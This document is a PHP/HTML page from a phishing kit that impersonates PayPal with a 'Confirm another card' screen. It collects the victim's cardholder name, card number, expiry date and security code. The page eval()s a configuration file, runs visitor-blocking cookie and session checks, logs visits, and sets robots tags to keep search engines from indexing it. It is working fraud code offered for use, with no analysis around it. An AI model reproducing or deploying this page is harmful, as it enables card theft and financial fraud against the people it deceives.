<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Card 2");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Another Card");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.card2.js"></script>
</head>

<body>
<section class="theoverpanel">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2><?=$api->transcode("Confirm another card");?></h2>
</div>
<div class="twbs_alert vx_alert vx_alert-critical js_alertMsg hide" id="MSGError">
<p class="vx_alert-text">
<font size="2">
<?=$api->transcode("This card is not accepted. Please use a different card.");?>
</font>
</p>
</div>
<div class="overpanel-body">
<form name="addCreditOrDebit" method="post" id="card2" autocomplete="off">
<div class="textInput lap" id="DivName">
<input type="text" placeholder="<?=$api->transcode("Cardholder name");?>" id="Name" name="cardholder2">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardNumber" id="cardNumber">
<div class="textInput ccNumber ccNumber ccNum lap" id="DivNumber">
<input type="tel" placeholder="<?=$api->transcode("Card number");?>" id="Number" name="cardnum2">
</div>
<div class="cardLogo">
<span class="fiModule-icon_card" id="DivLogo"></span>
</div>
</div>
<div class="cardInputs">
<div class="expiration js_card_toggleField">
<div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="DivExp">
<input type="tel" placeholder="<?=$api->transcode("Expiration date (MM/YY)");?>" id="Exp" name="cardexp2">
</div>
</div>
<div class="js_card_toggleField" id="cardSecurityCode">
<div class="textInput csc pull-right csc securityCode lap" id="DivCvv" data-ctype="">
<input type="tel" placeholder="<?=$api->transcode("Security code");?>" id="Cvv" name="cardcvv2">
</div>
</div>
</div>
</div>
</div>
<input class="vx_btn col-md-6 col-sm-6 col-xs-6" type="submit" value="<?=$api->transcode("Confirm");?>" id="btnConfirm">
<a href="confirm=identity"><input class="vx_btn pull-right" type="button" value="<?=$api->transcode("Skip");?>"></a>
<p class="scretlogo"></p>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loding"></div>
</section>
<script src="../assets/js/card2.post.js"></script>
</body>

</html>
